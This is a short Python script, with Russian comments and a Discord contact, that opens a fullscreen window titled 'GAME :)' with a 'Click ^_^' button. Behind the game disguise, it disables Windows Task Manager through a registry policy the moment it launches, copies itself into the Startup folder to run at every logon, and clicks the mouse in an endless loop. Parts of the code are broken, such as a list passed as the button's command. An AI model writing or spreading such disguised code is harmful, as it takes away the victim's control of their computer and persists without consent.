import tkinter as tk
import pyautogui
import subprocess
import shutil
import os
from tkinter import *

def start():
    while True:
        pyautogui.click()

def disable_task_manager():
    try:
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], check=True)
    except subprocess.CalledProcessError:
        print("Не удалось отключить диспетчер задач.")

def add_to_startup():
    current_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shutil.copy2(current_path, startup_path)

def minimize():
    root.iconify()

root = tk.Tk()
root.title("GAME :)")
root.attributes("-toolwindow", True)
root.attributes("-fullscreen", True)
root.resizable (width=False, height=False)



start_button = tk.Button (root, text="Click ^_^", command = [start,minimize], width=1920, height=1080, font=('Comic Sans MS', 20, 'bold'), bg='black', fg='white')
start_button.place(relx=0.5,rely=0.5, anchor=CENTER)
start_button.pack(pady=10)

disable_task_manager()
add_to_startup() 

root.mainloop()

#Баги, ошибки? Пишите в Discord @suggika

